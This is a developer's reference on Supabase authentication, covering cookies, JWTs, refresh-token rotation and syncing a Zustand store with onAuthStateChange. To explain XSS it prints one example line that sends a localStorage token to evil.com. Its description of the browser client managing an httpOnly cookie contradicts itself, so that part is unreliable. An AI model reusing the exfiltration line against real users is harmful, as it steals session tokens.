# Auth Tokens, Cookies & the Refresh Flow

A full reference for how Supabase authentication actually works under the hood — cookies,
access tokens, refresh tokens, XSS, and where Zustand fits in all of it.

---

## The backstory — why we wrote this doc

We lost focus session data silently. Sessions completed normally, the timer rang, the UI
moved on — but nothing appeared in the stats. No error, no warning, nothing.

After digging in, we found two problems:

1. There was no listener for auth state changes — so if anything went wrong with
   authentication while the app was open, the app had no idea
2. The API call that saves sessions used `.catch(() => {})` — so any failure was
   swallowed completely, no log, no trace

We fixed both. But fixing them raised deeper questions: how do tokens actually work?
What is a cookie exactly? Why does the token expire? What is the refresh token for?
This doc answers all of that from scratch.

---

## What is a cookie and why does auth use it?

When you log into a website, the server needs a way to remember you on every future
request. HTTP is stateless — every request is independent, the server has no memory
of the last one. Cookies solve this.

A **cookie** is a small piece of text the server tells your browser to store. The browser
then automatically sends it back with every request to that domain. You don't do anything —
it just happens.

```
Sign in → server says "store this cookie"
Next request → browser automatically sends the cookie
Server reads cookie → knows who you are
```

### Why not just use localStorage?

You could store the token in localStorage instead of a cookie. Some apps do. But cookies
have a superpower: the `httpOnly` flag.

**`httpOnly` cookie** — the browser stores it and sends it automatically, but JavaScript
running on the page **cannot read it**. Zero access. Not even your own code.

This matters because of **XSS (Cross-Site Scripting)**. XSS is when an attacker manages
to inject malicious JavaScript into your page — through a comment field, a URL parameter,
a third-party script that gets compromised. If your token is in localStorage, that
malicious script can read it and steal it:

```
// attacker's injected script
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))
```

With an `httpOnly` cookie, this attack is blocked. The script can't read the cookie.
It doesn't matter what JavaScript runs on the page — the token is invisible to it.

```
localStorage token  →  any JS on the page can read it  →  XSS steals it  ✗
httpOnly cookie     →  only the browser sees it         →  XSS can't touch it  ✓
```

Supabase uses `httpOnly` cookies for exactly this reason. Your token is never exposed
to JavaScript — including your own app code.

---

## Access token — your temporary ID badge

When you sign in, Supabase gives you an **access token**. This is a JWT (JSON Web Token)
— a string of text that proves who you are.

Every API call your app makes sends this token. The server reads it, verifies it, and
knows which user is making the request.

**It expires after 1 hour.** This is intentional. If someone steals your access token
somehow, it only works for a limited time. Short expiry = less damage from theft.

### What's inside a JWT?

A JWT has three parts separated by dots: `header.payload.signature`

- **Header** — says what type of token this is
- **Payload** — the actual data: your user id, email, when it expires
- **Signature** — a cryptographic proof that Supabase created this token and nobody
  tampered with it

The header and payload are just base64 encoded — anyone can decode and read them.
The signature is what makes it trustworthy. Only Supabase can create a valid signature,
so the server can verify the token is real without storing it anywhere.

```
eyJhbGciOiJIUzI1NiJ9  ←  header (base64)
.eyJ1c2VyX2lkIjoiMTIz  ←  payload: { user_id: "123", exp: 1234567890 }
.x7Hv9kLmNpQ...         ←  signature (only Supabase can forge this)
```

---

## Refresh token — your long-term renewal card

Since the access token only lasts 1 hour, you'd have to sign in every hour without
a refresh token. That would be terrible UX.

The **refresh token** solves this. It's a second token, also stored in the cookie,
that lasts 7 days. Its only job is to get you a new access token when the old one expires.

Think of it like this:
- Access token = wristband at a concert. Proves you're in. Expires tonight.
- Refresh token = membership card. Lets you get a new wristband next time without
  queuing at the box office again.

The refresh token itself cannot be used to access your data — it can only be exchanged
for a new access token.

---

## The full sign-in flow — step by step

```
1. You click "Continue with Google"

2. Browser redirects to Google's login page
   Google authenticates you

3. Google redirects back to Supabase with a code

4. Supabase exchanges the code for your Google profile
   Supabase creates (or finds) your account in the database
   Supabase generates:
     - access token  (JWT, expires 1 hour)
     - refresh token (random string, expires 7 days)

5. Supabase redirects to your app (/api/auth/callback)
   Sets an httpOnly cookie containing both tokens

6. Your app's layout runs getSession()
   Reads the cookie → gets the session → sets user in Zustand store

7. UI shows your avatar. You're in.
```

```
┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
│  Browser │     │  Google  │     │ Supabase │     │ Your App │
└────┬─────┘     └────┬─────┘     └────┬─────┘     └────┬─────┘
     │  click sign in │               │                  │
     │───────────────►│               │                  │
     │  redirect back │               │                  │
     │◄───────────────│  code         │                  │
     │                │──────────────►│                  │
     │                │               │  create tokens   │
     │  set cookie    │               │  (access+refresh)│
     │◄───────────────────────────────│                  │
     │  /api/auth/callback            │                  │
     │───────────────────────────────────────────────────►
     │  getSession() → set Zustand user                  │
```

---

## The full token refresh flow — what happens at 1 hour

The Supabase client JS library (the npm package running in your browser) has a built-in
timer. When you sign in, it reads the access token's expiry time and sets a countdown.

Just before the access token expires, it does this automatically — no page reload,
no user action, completely silent:

```
1. Supabase client's timer fires (just before 1 hour)

2. Supabase client calls Supabase server:
   POST https://yourproject.supabase.co/auth/v1/token
   body: { grant_type: "refresh_token", refresh_token: "abc..." }

3. Supabase server verifies the refresh token
   Responds with:
     - new access token  (valid 1 more hour)
     - new refresh token (valid 7 more days)
   Note: the old refresh token is now invalid — each refresh generates a new one

4. Supabase client updates the cookie with both new tokens

5. Everything continues. You stay logged in.
```

**Important:** The Supabase server never pushes anything. It only responds when asked.
The Supabase client is the one that initiates the refresh by watching the expiry time
and calling the server at the right moment.

### What if the refresh fails?

If the refresh token is expired (7 days of inactivity), or revoked, or the network
is down — the refresh fails. The Supabase client fires a `SIGNED_OUT` event.
Without a listener for that event, your app has no idea this happened.

---

## Where Zustand fits — and where it doesn't

This is the key thing to understand:

**Zustand does not store the token. It never sees the token. The token lives only in
the httpOnly cookie, managed entirely by the Supabase client.**

What Zustand stores is the **user object** — just enough info to render the UI:

```ts
user: {
  id: "123",
  email: "you@example.com",
  displayName: "Sandeep",
  avatarUrl: "https://..."
}
```

This is set once on page load from `getSession()`. It's what makes your avatar appear
in the header, gates the "save session" logic, and so on.

```
┌─────────────────────────────────────────────────────────┐
│                      Your Browser                        │
│                                                         │
│  ┌──────────────────────┐    ┌────────────────────────┐ │
│  │    Zustand Store     │    │    Supabase Client     │ │
│  │                      │    │    (@supabase/js)      │ │
│  │  user: {             │    │                        │ │
│  │    id: "123"         │    │  manages httpOnly      │ │
│  │    email: "..."      │    │  cookie internally     │ │
│  │  }                   │    │                        │ │
│  │                      │    │  access_token: JWT     │ │
│  │  used by UI to:      │    │  refresh_token: xyz    │ │
│  │  - show avatar       │    │                        │ │
│  │  - gate saves        │    │  auto-refreshes        │ │
│  │  - show stats        │    │  at 1 hour             │ │
│  └──────────────────────┘    └────────────────────────┘ │
│           ▲                            │                 │
│           │   onAuthStateChange        │                 │
│           └────────────────────────────                 │
│              (the bridge)                               │
└─────────────────────────────────────────────────────────┘
                                │
                    ┌───────────▼────────────┐
                    │    Supabase Servers     │
                    │  database + auth APIs  │
                    └────────────────────────┘
```

### The bridge — `onAuthStateChange`

The Supabase client does its own thing (managing tokens, refreshing, signing out).
Zustand does its own thing (holding UI state). They don't automatically talk.

`onAuthStateChange` is the bridge. It's a listener on the Supabase client that fires
every time auth state changes. We use it to keep Zustand in sync:

```ts
supabase.auth.onAuthStateChange((event, session) => {
  if (event === "TOKEN_REFRESHED" && session?.user) {
    // token just refreshed — update Zustand so it stays in sync
    setUser({ id: session.user.id, email: session.user.email ?? "" });
  }
  if (event === "SIGNED_OUT") {
    // refresh failed or user signed out — clear Zustand
    // so the UI reflects reality (no longer authenticated)
    setUser(null);
  }
});
```

Without this listener, Zustand can go out of sync with actual auth state — especially
when the refresh token expires and Supabase signs the user out silently.

---

## The full sign-out flow

```
Manual sign out:
  User clicks sign out
  → supabase.auth.signOut() called
  → Supabase server invalidates the refresh token
  → Cookie is cleared
  → onAuthStateChange fires: SIGNED_OUT
  → Zustand: setUser(null)
  → UI clears, redirects to landing page

Automatic sign out (refresh token expired):
  Supabase client tries to refresh at 1 hour
  → refresh token is expired (7 days passed)
  → Supabase server rejects it
  → onAuthStateChange fires: SIGNED_OUT
  → Zustand: setUser(null)
  → UI clears
```

---

## Events `onAuthStateChange` fires

| Event | When | What to do in Zustand |
|---|---|---|
| `SIGNED_IN` | User just signed in | Set user, sync from DB |
| `TOKEN_REFRESHED` | Access token silently renewed | Update user in store |
| `SIGNED_OUT` | Signed out manually or refresh expired | Clear user from store |
| `USER_UPDATED` | Email or password changed | Refresh user in store |
| `PASSWORD_RECOVERY` | Password reset link clicked | Handle recovery flow |

---

## Rules for every future Supabase app

1. **Always add `onAuthStateChange` in the app shell** — before anything else.
   Without it you're blind to token expiry and sign-out events.

2. **Never store the token in Zustand or localStorage** — it's in the httpOnly cookie,
   managed by the Supabase client. Don't try to touch it.

3. **Never use `.catch(() => {})` on a write** — log at minimum so failures are visible.

4. **Test token expiry** — Supabase dashboard → Auth settings → set JWT expiry to
   60 seconds. Use the app for a minute, try to save. If it fails silently, you have a bug.
